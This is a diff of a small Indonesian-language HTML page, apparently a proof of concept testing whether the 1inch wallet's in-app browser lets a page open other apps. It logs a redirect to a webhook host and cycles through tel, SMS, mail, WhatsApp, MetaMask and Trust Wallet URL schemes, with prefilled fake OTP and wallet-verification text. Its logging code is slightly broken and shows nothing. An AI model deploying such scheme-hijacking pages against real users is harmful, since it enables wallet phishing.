@@ -1,13 +1,28 @@
 <!DOCTYPE html>
 <html>
 <body>
-<a href="1inch://browser?url=https://0x403for.github.io/1inch.html">Buka di 1inch</a>
-<br><br>
-<button onclick="go()">Auto Redirect</button>
+<button onclick="hijack()">Test Buka App Lain</button>
+<pre id="o"></pre>
 <script>
-function go(){
-  location.href = "https://app.1inch.io/#/1/swap?from=ETH&to=USDT";
-  setTimeout(()=>{ location.href = "https://webhooksite.net/9782dc22-d216-43c9-a513-905aa2d97d00?redirect=berhasil"; }, 1000);
+function hijack(){
+  let apps = [
+    'tel://08123456789',
+    'sms://08123456789?body=Kode OTP 1inch kamu: 123456',
+    'mailto: support@1inch.io?subject=Verifikasi Wallet',
+    'whatsapp://send?text=Halo',
+    'metamask://',
+    'trust://'
+  ];
+  let i = 0;
+  let out = "";
+  setInterval(()=>{
+    if(i < apps.length){
+      out += "Coba buka: " + apps[i] + "\n";
+      window.location.href = apps[i];
+      i++;
+    }
+  }, 1000);
+  document.getElementById('o').innerText = out;
 }
 </script>
 </body>
